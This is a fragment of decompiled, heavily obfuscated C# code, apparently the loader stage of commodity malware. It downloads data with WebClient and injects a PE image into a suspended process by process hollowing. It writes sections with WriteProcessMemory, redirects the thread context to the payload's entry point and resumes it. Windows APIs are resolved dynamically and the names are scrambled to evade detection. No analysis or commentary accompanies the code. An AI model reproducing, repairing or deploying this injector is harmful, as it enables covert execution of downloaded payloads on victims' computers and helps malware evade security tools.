								break;
							}
							libInvoker2.CastToDelegate<NativeDelegates.IsWow64ProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(362))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, ref isWow);
							num2 = 67;
							break;
						case 16:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							num2 = 13;
							break;
						case 35:
							if (!libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
							{
								goto IL_02d0_2;
							}
							num2 = 15;
							if (0 == 0)
							{
								break;
							}
							goto case 33;
						case 33:
							if (!libInvoker2.CastToDelegate<NativeDelegates.Wow64GetThreadContextDelegate>((string)hyeIf8kQMpw1tHqiUk(510))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT))
							{
								num2 = 35;
								break;
							}
							goto IL_02d0_2;
						case 12:
							if (!libInvoker2.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>((string)hyeIf8kQMpw1tHqiUk(470))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, KYyx7heXmh4xMgMoGB(intPtr2.ToInt64() + ptr3->VirtualAddress), KYyx7heXmh4xMgMoGB(lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU.ToInt64() + ptr3->PointerToRawData), ptr3->SizeOfRawData, IntPtr.Zero))
							{
								num2 = 48;
								break;
							}
							goto IL_0c0b_2;
						case 42:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							num2 = 21;
							break;
						case 61:
							num5++;
							num2 = 40;
							break;
						case 59:
							array = new byte[8];
							num2 = 23;
							break;
						case 29:
							cONTEXT.Eax = (uint)(intPtr2.ToInt64() + ptr->OptionalHeader.AddressOfEntryPoint);
							num2 = 32;
							break;
						case 68:
							if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
							{
								num2 = 16;
								break;
							}
							goto case 17;
						case 26:
							result = false;
							num2 = 47;
							break;
						case 56:
							result = false;
							num2 = 70;
							break;
						case 23:
							num5 = 0;
							num2 = 24;
							if (true)
							{
								break;
							}
							goto case 53;
						case 53:
							if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
							{
								num2 = 34;
								break;
							}
							goto IL_02d0_2;
						case 51:
							if (num5 == 7)
							{
								num2 = 0;
								break;
							}
							goto case 61;
						case 49:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							num2 = 36;
							break;
						case 58:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							num2 = 69;
							if (u7ErfqWZ183yXIpHYx())
							{
							}
							break;
						case 9:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							num2 = 56;
							break;
						case 44:
							if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
							{
								num2 = 49;
								break;
							}
							goto IL_0594_2;
						case 46:
							result = false;
							H1DIKAhjafGG6NU9RH();
							if (u7ErfqWZ183yXIpHYx())
							{
								num2 = 27;
								if (H1DIKAhjafGG6NU9RH())
								{
									break;
								}
								goto case 55;
							}
							num2 = 50;
							break;
						case 62:
							num4 = (ulong)intPtr2.ToInt64();
							num2 = 59;
							break;
						case 24:
						case 40:
							if (num5 < 8)
							{
								array[num5] = (byte)(num4 >> num5 * 8);
								num2 = 51;
								if (1 == 0)
								{
									return result;
								}
							}
							else
							{
								num2 = 11;
							}
							break;
						case 57:
							if (libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
							{
								num2 = 37;
								break;
							}
							goto IL_0594_2;
						case 25:
						case 31:
							if (num3 < ptr->FileHeader.NumberOfSections)
							{
								ptr3 = (IMAGE_SECTION_HEADER*)(lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU.ToInt64() + ptr2->e_lfanew + UBCRs2MjCDw5sBrlGV(zHbqiUFwJD0yvXv2xo(typeof(IMAGE_NT_HEADERS).TypeHandle)) + UBCRs2MjCDw5sBrlGV(zHbqiUFwJD0yvXv2xo(typeof(IMAGE_SECTION_HEADER).TypeHandle)) * num3);
								num2 = 12;
							}
							else
							{
								num2 = 30;
							}
							break;
						case 39:
							if (!libInvoker2.CastToDelegate<NativeDelegates.TerminateProcessDelegate>((string)hyeIf8kQMpw1tHqiUk(300))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
							{
								goto IL_0417_2;
							}
							num2 = 18;
							if (H1DIKAhjafGG6NU9RH())
							{
								break;
							}
							goto case 8;
						case 8:
							bce0rcUmwLW6IfYsHg(intPtr);
							num2 = 14;
							if (true)
							{
								break;
							}
							goto case 20;
						case 20:
							result = false;
							num2 = 60;
							break;
						case 15:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							num2 = 42;
							break;
						default:
							num2 = 53;
							break;
						case 45:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
							num2 = 66;
							if (0 == 0)
							{
								break;
							}
							goto case 71;
						case 71:
							libInvoker2.CastToDelegate<NativeDelegates.CloseHandleDelegate>((string)hyeIf8kQMpw1tHqiUk(336))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							goto end_IL_0c61_2;
						case 1:
							return result;
						case 4:
							return result;
						case 7:
							return result;
						case 19:
						case 50:
							return result;
						case 22:
							return result;
						case 47:
							return result;
						case 52:
							return result;
						case 60:
							return result;
						case 70:
							{
								return result;
							}
							IL_0c0b_2:
							num3 = (ushort)(num3 + 1);
							num2 = 31;
							if (u7ErfqWZ183yXIpHYx())
							{
							}
							break;
							IL_02d0_2:
							intPtr = T1q2hfC7gLYWB0rhJi(8);
							num2 = 62;
							break;
							IL_06d9_2:
							if (libInvoker2.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>((string)hyeIf8kQMpw1tHqiUk(470))(lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, intPtr2, lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU, ptr->OptionalHeader.SizeOfHeaders, IntPtr.Zero))
							{
								goto IL_0417_2;
							}
							num2 = 39;
							if (H1DIKAhjafGG6NU9RH())
							{
								break;
							}
							goto case 28;
							IL_0594_2:
							libInvoker2.CastToDelegate<NativeDelegates.ResumeThreadDelegate>((string)hyeIf8kQMpw1tHqiUk(674))(lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
							num2 = 54;
							if (true)
							{
								break;
							}
							goto case 37;
							IL_0417_2:
							num3 = 0;
							num2 = 25;
							if (true)
							{
								break;
							}
							goto case 27;
							IL_0354_2:
							bce0rcUmwLW6IfYsHg(intPtr);
							num2 = 29;
							break;
						}
						continue;
						end_IL_0c61_2:
						break;
					}
				}
				finally
				{
					if (libInvoker2 != null)
					{
						fjDxPK5gg2FIKlNcb4(libInvoker2);
					}
				}
				return true;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void ocugpjv9LU5ZsqSXbx(SecurityProtocolType P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		ServicePointManager.SecurityProtocol = P_0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object hyeIf8kQMpw1tHqiUk(int _0020)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ajPWp7JpCnYwAxGgPj.g4tWycSQ4(_0020);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object kjLfjKO7N1UEwYegLO(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((WebClient)P_0).DownloadData((Uri)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object shocnZyIWWD07yNZVX()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Application.ExecutablePath;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object sQu61aqaHxVWmFoZsF(object P_0, object P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return LoadParams.Create((byte[])P_0, (string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool s0VKkwYGaYW52GKDRJ(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Execute((LoadParams)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool H1DIKAhjafGG6NU9RH()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool u7ErfqWZ183yXIpHYx()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return false;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object xS3F4Guho5lkxZq5iN(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((LoadParams)P_0).Body;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void TfGZ17dVF9tuwLldwD(object P_0, int P_1, byte P_2)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		Buffer.SetByte((Array)P_0, P_1, P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int ROPbjnbZ7s0xuQg5lx(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Marshal.SizeOf(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object vcoArYfecpFmHgnPhp(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((LoadParams)P_0).AppPath;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object JMkonM7KPKXDLgocux()
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Assembly.GetEntryAssembly();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object e6uuHKXyeD3Gs4wbnp(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return ((Assembly)P_0).Location;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object ybQgLBAANPxnNEUBpk(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Path.GetDirectoryName((string)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool ssg8moaoKTZfb2mJwS(IntPtr P_0, IntPtr P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return P_0 != P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static IntPtr KYyx7heXmh4xMgMoGB(long P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return (IntPtr)P_0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool RomBjqlmBxxCECpGav(IntPtr P_0, IntPtr P_1)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return P_0 == P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static Type zHbqiUFwJD0yvXv2xo(RuntimeTypeHandle P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Type.GetTypeFromHandle(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int UBCRs2MjCDw5sBrlGV(Type P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Marshal.SizeOf(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static IntPtr T1q2hfC7gLYWB0rhJi(int P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		return Marshal.AllocHGlobal(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void faY4C8V7q0ETgKGXgt(object P_0, int P_1, IntPtr P_2, int P_3)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		Marshal.Copy((byte[])P_0, P_1, P_2, P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void bce0rcUmwLW6IfYsHg(IntPtr P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		Marshal.FreeHGlobal(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void fjDxPK5gg2FIKlNcb4(object P_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0003: Incompatible stack heights: 0 vs 1
		((IDisposable)P_0).Dispose();
	}
}
